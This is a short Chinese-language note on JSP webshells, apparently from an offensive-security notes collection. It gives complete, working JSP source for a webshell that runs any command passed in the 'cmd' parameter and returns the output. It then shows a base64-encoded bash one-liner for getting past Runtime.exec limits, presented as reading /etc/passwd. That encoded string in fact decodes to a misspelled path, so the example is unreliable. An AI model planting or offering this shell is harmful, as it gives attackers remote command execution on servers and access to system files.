# JSP Webshell

JSP(Java Server Pages)是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。

JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分

---

### 基础CMD命令执行+base64传输payload


```jsp
<%@ page import="java.util.*,java.io.*"%>
<%%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p;
        if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
            p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
        }
        else{
                p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            }
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
        }
    }
%>
</pre>
</BODY></HTML>
```

> [Runtime.getRuntime().exec踩坑总结](https://blog.51cto.com/stefanxfy/4722238)

> [java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (bewhale.github.io)](https://bewhale.github.io/tools/encode.html)

偶尔有时命令执行有效负载`Runtime.getRuntime().exec()`失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.

有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 `ls > dir_listing` 在shell中执行应该将当前目录的列表输出到名为的文件中 `dir_listing`. 但是在 `exec()` 函数的上下文中,该命令将被解释为获取 `>` 和 `dir_listing` 目录.

其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 `ls "My Directory"` 会被解释为 `ls '"My' 'Directory"'`.

在Base64编码的帮助下, 可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.

比如将 bash 命令

```bash
cat /etc/passwd
```

转换为: 

```shell
bash -c {echo,Y2F0IC9lcnR0Yy9wYXNzd2Q=}|{base64,-d}|{bash,-i}
```

---



